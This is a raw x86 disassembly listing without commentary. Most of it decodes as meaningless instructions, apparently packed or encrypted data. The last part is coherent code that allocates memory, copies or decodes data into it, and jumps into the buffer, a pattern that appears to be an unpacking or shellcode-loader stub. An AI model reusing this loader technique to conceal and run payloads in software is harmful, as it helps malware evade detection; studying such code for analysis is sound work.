  416120:	int    0x44
  416122:	not    bl
  416124:	icebp  
  416125:	or     DWORD PTR [edx-0x80],esp
  416128:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416129:	cmp    BYTE PTR [edx-0x9dd0ea8],ah
  41612f:	pushf  
  416130:	in     al,dx
  416131:	in     al,dx
  416132:	or     eax,0x1c43756b
  416137:	dec    eax
  416138:	cwd    
  41613a:	dec    ebp
  41613b:	xchg   edi,eax
  41613c:	inc    esi
  41613d:	mov    ebp,0x3ccd4c66
  416142:	dec    esi
  416143:	sbb    edi,DWORD PTR [ebp-0x39]
  416146:	mov    edx,0x15a27062
  41614b:	gs stos BYTE PTR es:[edi],al
  41614d:	push   edi
  41614f:	push   es
  416150:	mov    dl,BYTE PTR gs:[ebx]
  416153:	push   0xffffffce
  416155:	add    al,0x27
  416157:	mov    edi,0x244b3935
  41615c:	stos   DWORD PTR es:[edi],eax
  41615d:	popa   
  41615e:	inc    esp
  41615f:	or     esp,esp
  416161:	call   0xa12d0fcb
  416166:	mov    edi,0xd17c07df
  41616b:	mov    al,ds:0x990b8380
  416170:	inc    eax
  416171:	mov    ecx,DWORD PTR [edi+0x2]
  416174:	mov    ah,BYTE PTR [edi]
  416176:	adc    al,0x78
  416178:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416179:	repz loopne 0x41617f
  41617c:	out    dx,eax
  41617d:	and    ebp,ebp
  41617f:	xor    al,0xc
  416181:	loope  0x416146
  416183:	adc    dl,ah
  416185:	fisub  DWORD PTR [edx]
  416187:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416188:	outs   dx,DWORD PTR ds:[esi]
  416189:	pushf  
  41618a:	int3   
  41618b:	xchg   edi,eax
  41618c:	xchg   esi,eax
  41618d:	add    eax,0x5702e8c9
  416192:	jge    0x4161a4
  416194:	ror    DWORD PTR [ecx],1
  416196:	into   
  416197:	popa   
  416198:	pop    edi
  416199:	push   eax
  41619a:	call   0xf4859aa9
  41619f:	hlt    
  4161a0:	test   al,0xb5
  4161a2:	mov    esp,0x2254542d
  4161a7:	call   0x3b3e:0x83e70502
  4161ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161af:	lahf   
  4161b0:	rcr    DWORD PTR [eax+eax*8],1
  4161b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161b4:	(bad)
  4161b7:	pop    ss
  4161b8:	ficomp WORD PTR [edx-0x5]
  4161bb:	cwde   
  4161bc:	lods   eax,DWORD PTR ds:[esi]
  4161bd:	or     al,0xe7
  4161bf:	jbe    0x41620d
  4161c1:	cmp    edx,ecx
  4161c3:	sbb    dl,ch
  4161c5:	jmp    0x41619f
  4161c7:	mov    ds:0x94ce3c63,al
  4161cc:	clc    
  4161cd:	aad    0xa9
  4161cf:	(bad)  
  4161d0:	fbld   TBYTE PTR [edi]
  4161d2:	and    BYTE PTR [edx+0x42],dl
  4161d5:	pop    eax
  4161d7:	stc    
  4161d8:	sub    esp,0xb3bac150
  4161de:	dec    ebp
  4161df:	fdiv   DWORD PTR [ebx+ebx*4-0xd14985e]
  4161e6:	mov    eax,ds:0x46ac2308
  4161eb:	mov    ch,0xcd
  4161ed:	sub    al,0x2a
  4161ef:	repnz cs cli 
  4161f2:	shr    DWORD PTR [edx],0xb6
  4161f5:	mov    bl,ch
  4161f7:	pop    edx
  4161f8:	push   cs
  4161f9:	sar    DWORD PTR [edx+0x370b03ff],cl
  4161ff:	dec    ebx
  416200:	fs push esp
  416202:	jo     0x4161b9
  416204:	jbe    0x416255
  416206:	mov    ah,0xeb
  416208:	retf   0xbf4a
  41620b:	push   DWORD PTR [ebx]
  41620d:	mov    esp,0x673e498f
  416212:	add    bl,bh
  416214:	cmc    
  416215:	cmp    DWORD PTR [esi-0x7ad68855],edi
  41621b:	lods   eax,DWORD PTR ds:[esi]
  41621c:	sar    DWORD PTR [ecx+0x14],0x79
  416220:	mov    ch,BYTE PTR [esi-0xe88ed86]
  416226:	inc    ebp
  416227:	xor    BYTE PTR [ebp-0x80],bh
  41622a:	add    eax,DWORD PTR [esp+edi*2+0x3ac4df48]
  416231:	jle    0x4161e2
  416233:	jae    0x4161cd
  416235:	sub    DWORD PTR [ebx+0x62df62c8],edx
  41623b:	es in  al,0xab
  41623e:	aad    0x87
  416240:	cwde   
  416241:	adc    bl,BYTE PTR [esi+0xf]
  416244:	mov    al,0xf2
  416246:	out    dx,eax
  416247:	mov    eax,0xa541d4aa
  41624c:	mov    esp,0xde357c00
  416251:	cwde   
  416252:	sub    BYTE PTR [ebx+0x28],dl
  416255:	inc    esp
  416256:	mov    ebx,0x9cd1dea4
  41625b:	(bad)  
  41625c:	xor    bh,BYTE PTR [esi-0x6b]
  41625f:	or     DWORD PTR [ebp+0x65940a78],eax
  416265:	pop    ds
  416266:	add    DWORD PTR ds:0xd893a3dd,edi
  41626c:	bound  ecx,QWORD PTR [ebx-0x2b]
  41626f:	adc    dh,BYTE PTR [edx]
  416271:	mov    esp,0x3fee71e1
  416276:	cmp    ebx,DWORD PTR [edx+0x48]
  416279:	push   ecx
  41627a:	stos   BYTE PTR es:[edi],al
  41627b:	bound  ebp,QWORD PTR [edx+0x51]
  41627e:	and    al,0xec
  416280:	and    al,0xac
  416282:	mov    al,ds:0x76288f0d
  416287:	ja     0x4162cd
  416289:	jmp    DWORD PTR [edi]
  41628b:	jbe    0x6965f4fe
  416291:	aad    0xc0
  416293:	pop    eax
  416294:	sti    
  416295:	pop    ebx
  416296:	retf   
  416297:	pop    ebx
  416298:	ss retf 
  41629a:	sub    DWORD PTR [esi+0xc6b9020],edx
  4162a0:	dec    edi
  4162a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162a2:	add    eax,0x4dd51932
  4162a7:	pop    esi
  4162a8:	mov    eax,0x15f91d33
  4162ad:	push   esi
  4162ae:	addr16 push eax
  4162b0:	fld    st(6)
  4162b2:	adc    eax,0xef10fafd
  4162b7:	cdq    
  4162b8:	enter  0x58ae,0x85
  4162bc:	test   al,0x92
  4162be:	mov    WORD PTR [ecx-0x19818829],?
  4162c4:	jg     0x4162aa
  4162c6:	call   0xe9611e71
  4162cb:	push   edi
  4162cc:	mov    ah,0x77
  4162ce:	mov    bh,0x4
  4162d0:	jae    0x4162a2
  4162d2:	push   0xf96758a4
  4162d7:	add    BYTE PTR [edx-0x71],cl
  4162da:	js     0x4162f5
  4162dc:	cld    
  4162dd:	fdiv   QWORD PTR [ebx]
  4162df:	sbb    al,0xfa
  4162e1:	loopne 0x4162d3
  4162e3:	icebp  
  4162e4:	and    cl,BYTE PTR [ecx-0x1b29e37d]
  4162ea:	inc    esi
  4162eb:	test   al,0xeb
  4162ed:	and    BYTE PTR [eax],ah
  4162ef:	jle    0x416275
  4162f1:	jge    0x41632e
  4162f3:	outs   dx,BYTE PTR ds:[esi]
  4162f4:	xchg   esp,eax
  4162f5:	mov    dh,0x74
  4162f7:	ss xchg ebx,esp
  4162fa:	ds mov esi,0xeaef591
  416300:	xchg   ebx,eax
  416301:	mov    cl,0xbd
  416303:	jns    0x4162f3
  416305:	cwde   
  416306:	int    0x20
  416308:	jbe    0x4162a0
  41630a:	call   0xc8d219ac
  41630f:	fstp   QWORD PTR [edi-0x61]
  416312:	mov    esi,0x5e8dca2e
  416317:	out    dx,eax
  416318:	ins    BYTE PTR es:[edi],dx
  416319:	sbb    cl,bh
  41631b:	and    cl,dl
  41631d:	mov    ebx,0xb8191a27
  416322:	sti    
  416323:	std    
  416324:	in     al,dx
  416325:	outs   dx,DWORD PTR ds:[esi]
  416326:	jmp    0xeb308b14
  41632b:	retf   0xd3
  41632e:	clc    
  41632f:	mov    ch,0x2a
  416331:	ret    
  416332:	cmp    DWORD PTR [ebx-0x7d4894f4],edx
  416338:	test   eax,0x968ab3ba
  41633d:	mov    cl,0xa1
  41633f:	xchg   edi,eax
  416340:	popa   
  416341:	into   
  416342:	das    
  416343:	cdq    
  416344:	mov    ah,0xd3
  416346:	push   ecx
  416347:	ret    0x1c7e
  41634a:	arpl   bp,bp
  41634c:	ins    BYTE PTR es:[edi],dx
  41634d:	cwde   
  41634e:	retf   
  41634f:	mov    esp,0x72dc1605
  416354:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416355:	jnp    0x4162de
  416357:	cmp    ecx,esp
  416359:	sbb    eax,0xaa83f8bd
  41635e:	mov    ebp,0xbae21ffe
  416363:	mov    bh,0xc4
  416365:	jbe    0x416365
  416367:	std    
  416368:	mov    al,0xcc
  41636a:	mov    bl,0x8a
  41636c:	mov    al,0x41
  41636e:	popf   
  41636f:	pushf  
  416370:	test   ebx,esi
  416372:	call   0x17e693d1
  416377:	mov    bl,0x39
  416379:	mov    al,0xb4
  41637b:	icebp  
  41637c:	and    eax,0x3ef0ade1
  416381:	dec    eax
  416382:	sub    DWORD PTR [edx-0x2c],ebp
  416385:	cmp    eax,0xad1fed65
  41638a:	cmp    al,0x12
  41638c:	in     al,dx
  41638d:	push   0x7c027b04
  416392:	push   ebp
  416393:	ss pushf 
  416395:	or     DWORD PTR [ecx-0x3549cd45],esi
  41639b:	cdq    
  41639c:	test   al,0xf6
  41639e:	cmp    dl,BYTE PTR [ebx-0x3a92a997]
  4163a4:	test   eax,0x648e2c77
  4163a9:	outs   dx,BYTE PTR ds:[esi]
  4163aa:	repnz out dx,eax
  4163ac:	js     0x4163fa
  4163ae:	push   ebx
  4163af:	or     eax,0xb59bdce3
  4163b4:	ins    BYTE PTR es:[edi],dx
  4163b5:	ss dec ebp
  4163b7:	mul    edi
  4163b9:	cld    
  4163ba:	xchg   edx,eax
  4163bb:	cmc    
  4163bc:	xchg   BYTE PTR ds:[ebx+0x79],dl
  4163c0:	pushf  
  4163c1:	js     0x416426
  4163c3:	push   eax
  4163c4:	dec    ebp
  4163c5:	jno    0x416349
  4163c7:	add    BYTE PTR [ecx-0x4e],dl
  4163ca:	and    DWORD PTR [eax+ecx*8],0x4d
  4163ce:	popa   
  4163cf:	push   cs
  4163d0:	outs   dx,DWORD PTR ds:[esi]
  4163d1:	dec    ebx
  4163d2:	in     eax,0x92
  4163d4:	fidivr DWORD PTR cs:[ebx]
  4163d7:	sahf   
  4163d8:	ja     0x4163f2
  4163da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163db:	test   eax,0x1cf0eca0
  4163e0:	stc    
  4163e1:	data16 xchg BYTE PTR [ecx],dh
  4163e4:	in     eax,0xfb
  4163e6:	dec    edx
  4163e7:	call   DWORD PTR [ecx+0x15]
  4163ea:	loop   0x416398
  4163ec:	mov    ebx,0x1b249616
  4163f1:	pop    es
  4163f2:	ds aaa 
  4163f4:	fst    QWORD PTR [ebp+0x71]
  4163f7:	mov    bl,0x57
  4163f9:	cmc    
  4163fa:	(bad)  
  4163fb:	mov    edx,0xf6a70ce0
  416400:	sbb    BYTE PTR [esi],0x1f
  416403:	fwait
  416404:	test   eax,0x1f84ad76
  416409:	pop    ecx
  41640a:	cs (bad) 
  41640c:	je     0x41640f
  41640e:	xchg   eax,ebp
  416410:	and    eax,0x4aa3fc1f
  416415:	jecxz  0x41646f
  416417:	jp     0x4163f9
  416419:	cmc    
  41641a:	lods   eax,DWORD PTR ds:[esi]
  41641b:	mov    fs,eax
  41641d:	mov    ds:0x143bdb5,eax
  416422:	lods   al,BYTE PTR ds:[esi]
  416423:	repnz and eax,0xf42783d1
  416429:	jo     0x4163c5
  41642b:	push   edi
  41642c:	arpl   WORD PTR [edx-0x72b724fa],dx
  416432:	add    al,0x12
  416434:	stos   DWORD PTR es:[edi],eax
  416435:	pop    esi
  416436:	jl     0x416425
  416438:	mov    edx,0xdf0274cf
  41643d:	dec    ebx
  41643e:	stc    
  41643f:	aad    0xd8
  416441:	test   BYTE PTR [esi+0x4c],bl
  416444:	je     0x416411
  416446:	pop    esp
  416447:	jp     0x41646f
  416449:	loope  0x416479
  41644b:	or     ebp,edi
  41644d:	mov    cl,0xb4
  41644f:	imul   esp,DWORD PTR [ecx+edi*2],0x8886f323
  416456:	cld    
  416457:	mov    edi,tr2
  41645a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41645b:	out    dx,eax
  41645c:	and    cl,0xd3
  41645f:	or     eax,0x9618adae
  416464:	fbstp  TBYTE PTR [ebx+0x40]
  416467:	or     al,0x1b
  416469:	xchg   ebp,eax
  41646a:	push   ds
  41646b:	outs   dx,BYTE PTR ds:[esi]
  41646c:	loope  0x416424
  41646e:	pop    esp
  41646f:	test   al,0xa0
  416471:	cmp    esi,ebp
  416473:	push   ss
  416474:	push   cs
  416475:	test   ebp,ebx
  416477:	xchg   ecx,eax
  416478:	mov    bh,0xc2
  41647a:	ficom  DWORD PTR [esi-0x3eca17b8]
  416480:	addr16 aam 0x14
  416483:	retf   0xa926
  416486:	pop    esp
  416487:	add    al,0xed
  416489:	out    dx,eax
  41648a:	fist   WORD PTR [ebp+0x22]
  41648d:	loopne 0x41642d
  41648f:	mov    bh,0xa
  416491:	aas    
  416492:	dec    eax
  416493:	and    al,0x7f
  416495:	push   cs
  416496:	jmp    0xab960400
  41649b:	xchg   ecx,eax
  41649c:	retf   0xeb59
  41649f:	lds    esi,FWORD PTR [eax+eiz*1+0x52]
  4164a3:	outs   dx,DWORD PTR ds:[esi]
  4164a4:	rcl    DWORD PTR [esp+eiz*8+0x6ed8635f],cl
  4164ab:	scas   al,BYTE PTR es:[edi]
  4164ac:	sbb    BYTE PTR [ebx-0x21],bh
  4164af:	cmp    esp,ebx
  4164b1:	dec    edx
  4164b2:	ja     0x4164f8
  4164b4:	xchg   edx,eax
  4164b5:	fild   DWORD PTR [ebx+0x1]
  4164b8:	jle    0x4164a9
  4164ba:	aaa    
  4164bb:	add    BYTE PTR [ebx],al
  4164bd:	dec    ecx
  4164be:	retf   0xbe41
  4164c1:	sub    ch,bl
  4164c3:	and    al,dh
  4164c5:	loop   0x4164aa
  4164c7:	test   al,0x13
  4164c9:	push   edx
  4164ca:	add    edx,DWORD PTR [ecx]
  4164cc:	mov    cs:0xd28dccf2,eax
  4164d2:	popf   
  4164d3:	shr    BYTE PTR [edi+0x7c869cfc],1
  4164d9:	lds    ebx,FWORD PTR [ebx+0x77]
  4164dc:	repnz das 
  4164de:	mov    esi,DWORD PTR [esi+0x4]
  4164e1:	xchg   DWORD PTR [esi+0x4a9e90c1],esi
  4164e7:	addr16 xor ecx,ebp
  4164ea:	pop    ebx
  4164eb:	cs ins BYTE PTR es:[edi],dx
  4164ed:	dec    ebx
  4164ee:	xor    eax,0x465b31e0
  4164f3:	push   ds
  4164f4:	sbb    cl,BYTE PTR [eax+0x4a]
  4164f7:	xor    ecx,eax
  4164f9:	adc    ah,bl
  4164fb:	push   ebp
  4164fc:	popf   
  4164fd:	xor    al,0x93
  4164ff:	mov    esp,0x363ca01c
  416504:	mov    BYTE PTR [ebx+esi*2],dh
  416507:	mov    ss,WORD PTR [ecx+0x39b11904]
  41650d:	dec    edx
  41650e:	xor    dl,bh
  416510:	xor    al,0xd1
  416512:	and    DWORD PTR [esi],esi
  416514:	or     esi,DWORD PTR [eax]
  416516:	jle    0x4164b5
  416518:	add    al,0x32
  41651a:	jmp    0x2b86f5ff
  41651f:	adc    esp,DWORD PTR [ebx+0x5ca11453]
  416525:	fild   WORD PTR [edx-0x14]
  416528:	push   edx
  416529:	ficom  WORD PTR [ebx+0x5fa1be73]
  41652f:	pop    esp
  416530:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416531:	lock loop 0x416551
  416534:	clc    
  416535:	cmp    bh,BYTE PTR [edx]
  416537:	rcr    eax,cl
  416539:	inc    esi
  41653a:	xor    esi,DWORD PTR [eax+ecx*4]
  41653d:	mov    al,0x6c
  41653f:	dec    edx
  416540:	fist   WORD PTR [ebx+0x2f]
  416543:	cmp    DWORD PTR [edx+ebx*4+0x52],ebp
  416547:	mov    dl,0xe9
  416549:	or     BYTE PTR [ecx],al
  41654b:	inc    esi
  41654c:	(bad)  
  41654d:	call   0x8a3e7e5d
  416552:	enter  0x1b01,0xc6
  416556:	cmp    bl,BYTE PTR [ebx]
  416558:	pop    es
  416559:	test   cl,cl
  41655b:	add    ebp,ebp
  41655d:	pop    eax
  41655e:	out    0xb,al
  416560:	xchg   ebp,esi
  416562:	sub    eax,0xcd930a3a
  416567:	ss in  al,0x88
  41656a:	fs jge 0x41651a
  41656d:	mov    cl,0xd4
  41656f:	bnd jl 0x4165e8
  416572:	xor    esi,DWORD PTR [ebp+0xed1ba26]
  416578:	in     eax,dx
  416579:	or     ebx,DWORD PTR [edi+0xf]
  41657c:	push   0x1b7d04c7
  416581:	and    ebx,edx
  416583:	ret    0x6d61
  416586:	jecxz  0x41650e
  416588:	mov    al,ds:0x5a0498fc
  41658d:	clc    
  41658e:	int    0x29
  416590:	or     BYTE PTR [esi-0x31],0x21
  416594:	push   esp
  416595:	test   al,0xc9
  416597:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416598:	ds data16 clc 
  41659b:	pop    DWORD PTR [eax]
  41659d:	call   0x46d8:0x552201b5
  4165a4:	mov    ds:0x42300c23,al
  4165a9:	hlt    
  4165aa:	es ins BYTE PTR es:[edi],dx
  4165ac:	mov    al,0x48
  4165ae:	int3   
  4165af:	pop    esp
  4165b0:	push   ds
  4165b1:	mov    edx,DWORD PTR [bx+0x1cee]
  4165b6:	mov    ecx,0x53d6c11f
  4165bb:	in     eax,0x8f
  4165bd:	addr16 push ecx
  4165bf:	add    eax,0x6a861bb9
  4165c4:	jmp    DWORD PTR [ecx+0x4a]
  4165c7:	xchg   edx,eax
  4165c8:	add    eax,DWORD PTR gs:[eax+0x9]
  4165cc:	daa    
  4165cd:	xchg   esp,eax
  4165ce:	pop    ds
  4165cf:	mov    ah,0x7
  4165d1:	sub    BYTE PTR [ecx-0x19],ch
  4165d4:	jmp    0x4165fa
  4165d6:	jne    0x4165ea
  4165d8:	aas    
  4165d9:	or     al,0xa2
  4165db:	rol    esi,1
  4165dd:	(bad)
  4165e0:	cmp    ch,BYTE PTR [eax+eiz*2+0x40]
  4165e4:	jb     0x4165a0
  4165e6:	outs   dx,DWORD PTR ds:[esi]
  4165e7:	add    eax,0x495145e2
  4165ec:	je     0x4165f8
  4165ee:	je     0x416653
  4165f0:	adc    esp,0xe
  4165f3:	lock and ebx,DWORD PTR [eax+0x6b]
  4165f7:	xor    al,BYTE PTR [edi]
  4165f9:	pop    edi
  4165fa:	icebp  
  4165fb:	add    bh,BYTE PTR [esi-0x2e27617d]
  416601:	ins    DWORD PTR es:[edi],dx
  416602:	push   ebx
  416603:	pop    ebp
  416604:	push   ds
  416605:	gs loop 0x416629
  416608:	lock mov ds:0xd3abb06,al
  41660e:	dec    eax
  41660f:	in     al,0x12
  416611:	call   0x3c44cacf
  416616:	lock popf 
  416618:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416619:	and    BYTE PTR [ecx],0xb7
  41661c:	repz inc edi
  41661e:	call   0xf127:0x8d05a869
  416625:	push   0x8959b44a
  41662a:	sbb    eax,0x9ac6175
  41662f:	push   ds
  416630:	ds dec esi
  416632:	ret    0xe9b8
  416635:	mov    ah,0x36
  416637:	sbb    dh,BYTE PTR [esi]
  416639:	fistp  DWORD PTR [ebx]
  41663b:	loopne 0x41669b
  41663d:	mov    esp,0x670134b1
  416642:	daa    
  416643:	jno    0x4165e7
  416645:	and    cl,BYTE PTR [ecx+esi*8]
  416648:	mov    al,ds:0xc39caeb2
  41664d:	pusha  
  41664e:	jno    0x4166a3
  416650:	jmp    0x5609:0x80985d60
  416657:	enter  0xa519,0x36
  41665b:	lods   al,BYTE PTR ds:[esi]
  41665c:	sahf   
  41665d:	(bad)  
  41665e:	rcr    BYTE PTR [eax+0x52],cl
  416661:	hlt    
  416662:	(bad)  [edi]
  416664:	pop    esi
  416665:	test   al,0xaa
  416667:	lea    ebx,[edi]
  416669:	jge    0x41665e
  41666b:	inc    ebp
  41666c:	xor    DWORD PTR [edx+0x70],esi
  41666f:	int    0x4
  416671:	outs   dx,DWORD PTR ds:[esi]
  416672:	in     eax,0xfc
  416674:	adc    dh,BYTE PTR [ecx-0x48]
  416677:	(bad)  
  416678:	idiv   DWORD PTR ds:0x41ed7f8
  41667e:	sub    ecx,DWORD PTR [eax+0x14]
  416681:	jl     0x41668c
  416683:	popa   
  416684:	int    0x64
  416686:	(bad)  
  416687:	popa   
  416688:	ficomp WORD PTR [edx+0x23]
  41668b:	sub    esi,eax
  41668d:	shl    DWORD PTR [eax],0x9c
  416690:	mov    ebp,0x8e9cdb44
  416695:	cmp    BYTE PTR [edi+ebx*1+0x6c41c370],0x59
  41669d:	stos   BYTE PTR es:[di],al
  41669f:	jge    0x4166b9
  4166a1:	inc    ecx
  4166a2:	push   es
  4166a3:	jl     0x4166b1
  4166a5:	xchg   esp,eax
  4166a6:	enter  0x18b6,0x9c
  4166aa:	shl    dh,cl
  4166ac:	mov    esp,ecx
  4166ae:	sub    al,bl
  4166b0:	scas   eax,DWORD PTR es:[edi]
  4166b1:	stc    
  4166b2:	stos   DWORD PTR es:[edi],eax
  4166b3:	mov    eax,ds:0x1a8b2b0b
  4166b8:	sbb    edx,DWORD PTR [ecx]
  4166ba:	sub    eax,0x9e3e8f2b
  4166bf:	pop    eax
  4166c0:	pop    esp
  4166c1:	jle    0x41671a
  4166c3:	aad    0x11
  4166c5:	push   ebx
  4166c6:	test   eax,0xd8aded98
  4166cb:	div    DWORD PTR [esi]
  4166cd:	neg    BYTE PTR [ebp+0x4c]
  4166d0:	adc    eax,0x57f2539
  4166d5:	sub    dh,bh
  4166d7:	jecxz  0x4166ff
  4166d9:	push   esi
  4166da:	mov    ecx,0xf02581e
  4166df:	(bad)  
  4166e0:	ds jo  0x416743
  4166e3:	scas   al,BYTE PTR es:[edi]
  4166e4:	stos   BYTE PTR es:[edi],al
  4166e5:	jle    0x416752
  4166e7:	mov    ebp,0x5ecb2462
  4166ec:	add    BYTE PTR [eax-0x73],al
  4166ef:	dec    edx
  4166f0:	mov    ds,esi
  4166f2:	dec    esi
  4166f3:	or     al,0xe4
  4166f5:	and    eax,0xf69aa5a9
  4166fa:	in     al,dx
  4166fb:	call   0xd882:0xeafb24bb
  416702:	or     dl,bl
  416704:	push   esp
  416705:	push   cs
  416706:	test   edx,eax
  416708:	popf   
  416709:	dec    esi
  41670a:	in     al,0x60
  41670c:	jnp    0x41678b
  41670e:	in     al,0xd6
  416710:	pop    edi
  416711:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416712:	mov    bl,0x57
  416714:	cld    
  416715:	out    dx,al
  416716:	rcr    BYTE PTR [esi-0x44],0x74
  41671a:	std    
  41671b:	jno    0x4166c7
  41671d:	push   edi
  41671e:	std    
  41671f:	sbb    al,0xd5
  416721:	inc    esi
  416722:	lea    esi,[edi-0x368c2930]
  416728:	call   DWORD PTR [edx+0x67055fe9]
  41672e:	call   0xfd073d94
  416733:	js     0x41670a
  416735:	sbb    DWORD PTR [ebx-0x44],ebx
  416738:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416739:	push   edx
  41673a:	adc    al,0xfa
  41673c:	in     al,dx
  41673d:	xchg   esi,eax
  41673e:	(bad)
  416742:	in     al,dx
  416743:	daa    
  416744:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416745:	xchg   ebx,eax
  416746:	lock aas 
  416748:	and    BYTE PTR [esi+eiz*8],dl
  41674b:	leave  
  41674c:	call   0xfb4:0x369a2e8c
  416753:	mov    dh,BYTE PTR [esi]
  416755:	jecxz  0x4166e7
  416757:	stos   DWORD PTR es:[edi],eax
  416758:	mov    al,0x1
  41675a:	sbb    eax,0x4646bd05
  41675f:	push   edi
  416760:	push   ss
  416761:	mov    ah,0xc7
  416763:	jg     0x416780
  416765:	mov    ch,0xca
  416767:	test   eax,0x2efac13d
  41676c:	hlt    
  41676d:	and    edi,DWORD PTR [ebx]
  41676f:	mov    al,0xe9
  416771:	mov    esi,0xa7f3b0e0
  416776:	hlt    
  416777:	scas   al,BYTE PTR es:[edi]
  416778:	dec    esi
  416779:	or     dh,BYTE PTR [edx]
  41677b:	mov    bp,0x879b
  41677f:	outs   dx,BYTE PTR ds:[esi]
  416780:	std    
  416781:	xlat   BYTE PTR ds:[ebx]
  416782:	push   0xfec0fa63
  416787:	sbb    edi,ecx
  416789:	push   0x67898173
  41678e:	fs mov ebp,0xbc8e7f6e
  416794:	pcmpgtd mm2,QWORD PTR [ebx+0x32]
  416798:	lods   al,BYTE PTR ds:[esi]
  416799:	loope  0x41673a
  41679b:	jne    0x41677b
  41679d:	sahf   
  41679e:	into   
  41679f:	mov    ebx,DWORD PTR [esi]
  4167a1:	mov    ecx,0xe18df633
  4167a6:	adc    ebx,DWORD PTR [ebp+edx*8-0x123eac9a]
  4167ad:	push   eax
  4167ae:	or     dh,al
  4167b0:	mov    esi,0xe5fad837
  4167b5:	call   DWORD PTR ds:0x418014
  4167bb:	mov    DWORD PTR [ebp-0x2c],eax
  4167be:	movzx  eax,WORD PTR [ebp-0x2c]
  4167c2:	cmp    eax,0x539
  4167c7:	jne    0x4167f8
  4167c9:	mov    DWORD PTR [ebp-0x14],0xe0d
  4167d0:	lea    ecx,[ebp-0x28]
  4167d3:	push   ecx
  4167d4:	call   DWORD PTR ds:0x418018
  4167da:	mov    DWORD PTR [ebp-0x60],eax
  4167dd:	mov    DWORD PTR [ebp-0x54],0x3a
  4167e4:	mov    BYTE PTR [ebp-0x34],0x0
  4167e8:	mov    DWORD PTR [ebp-0x8],0xa4076865
  4167ef:	mov    DWORD PTR [ebp-0x68],0x10b527
  4167f6:	jmp    0x416806
  4167f8:	mov    BYTE PTR ds:0x430700,0x0
  4167ff:	mov    BYTE PTR ds:0x41a770,0x0
  416806:	push   0x0
  416808:	call   DWORD PTR ds:0x418018
  41680e:	mov    DWORD PTR [ebp-0x2c],eax
  416811:	push   DWORD PTR ds:0x418018
  416817:	pop    edx
  416818:	mov    DWORD PTR [ebp-0x6c],edx
  41681b:	lea    edx,[ebp-0x40]
  41681e:	push   edx
  41681f:	mov    eax,DWORD PTR [ebp-0x60]
  416822:	push   eax
  416823:	call   DWORD PTR ds:0x418024
  416829:	mov    DWORD PTR [ebp-0x44],eax
  41682c:	push   DWORD PTR [ebp-0x30]
  41682f:	push   0x1000
  416834:	mov    eax,DWORD PTR [ebp-0x14]
  416837:	add    eax,0x46
  41683a:	push   eax
  41683b:	push   0x0
  41683d:	mov    ebx,DWORD PTR [ebp-0x44]
  416840:	call   ebx
  416842:	push   eax
  416843:	pop    ebx
  416844:	mov    DWORD PTR [ebp-0x4],ebx
  416847:	mov    ecx,DWORD PTR [ebp-0x68]
  41684a:	sub    ecx,0xdae0b
  416850:	mov    DWORD PTR [ebp-0x68],ecx
  416853:	cmp    DWORD PTR [ebp-0x4],0x0
  416857:	jne    0x416862
  416859:	push   0x0
  41685b:	push   0x0
  41685d:	call   0x417f22
  416862:	mov    edx,DWORD PTR [ebp-0x4]
  416865:	add    edx,DWORD PTR [ebp-0x14]
  416868:	mov    eax,DWORD PTR [ebp-0x8]
  41686b:	mov    DWORD PTR [edx],eax
  41686d:	mov    ecx,DWORD PTR [ebp-0x4]
  416870:	add    ecx,DWORD PTR [ebp-0x54]
  416873:	mov    DWORD PTR [ebp-0x5c],ecx
  416876:	mov    edx,DWORD PTR ds:0x418024
  41687c:	mov    DWORD PTR [ebp-0x4c],edx
  41687f:	mov    eax,DWORD PTR [ebp-0x4]
  416882:	add    eax,DWORD PTR [ebp-0x14]
  416885:	mov    ecx,DWORD PTR [ebp+0x8]
  416888:	mov    DWORD PTR [eax+0x4],ecx
  41688b:	mov    edx,DWORD PTR [ebp-0x4]
  41688e:	add    edx,DWORD PTR [ebp-0x14]
  416891:	mov    DWORD PTR [ebp-0xc],edx
  416894:	cmp    DWORD PTR [ebp-0x68],0x0
  416898:	jbe    0x4168b5
  41689a:	mov    eax,DWORD PTR [ebp-0xc]
  41689d:	push   eax
  41689e:	mov    ecx,DWORD PTR [ebp-0x14]
  4168a1:	push   ecx
  4168a2:	mov    edx,DWORD PTR [ebp-0x2c]
  4168a5:	add    edx,DWORD PTR [ebp-0x68]
  4168a8:	push   edx
  4168a9:	mov    eax,DWORD PTR [ebp-0x4]
  4168ac:	push   eax
  4168ad:	call   0x417e34
  4168b2:	add    esp,0x10
  4168b5:	cmp    DWORD PTR [ebp-0x5c],0x0
  4168b9:	je     0x4168c9
  4168bb:	push   DWORD PTR [ebp-0x4c]
  4168be:	push   DWORD PTR [ebp-0x6c]
  4168c1:	mov    ecx,DWORD PTR [ebp-0x5c]
  4168c4:	push   ecx
  4168c5:	jmp    ecx
  4168c7:	jmp    0x4168cf
  4168c9:	mov    ecx,DWORD PTR [ebp+0x8]
  4168cc:	mov    DWORD PTR [ebp-0x18],ecx
  4168cf:	mov    eax,0x1
  4168d4:	pop    ebx
  4168d5:	mov    esp,ebp
  4168d7:	pop    ebp
  4168d8:	ret    
  4168d9:	push   ebp
  4168da:	mov    ebp,esp
  4168dc:	pop    ebp
  4168dd:	ret    
  4168de:	push   ebp
  4168df:	mov    ebp,esp
  4168e1:	sub    esp,0x54
  4168e4:	mov    DWORD PTR [ebp-0x34],0x0
  4168eb:	mov    DWORD PTR [ebp-0x4],0x0
  4168f2:	mov    DWORD PTR [ebp-0x50],0x0
  4168f9:	mov    DWORD PTR [ebp-0x4c],0x0
  416900:	mov    DWORD PTR [ebp-0x30],0x0
  416907:	lea    eax,[ebp-0x38]
  41690a:	push   eax
  41690b:	push   0x8
  41690d:	call   DWORD PTR ds:0x418020
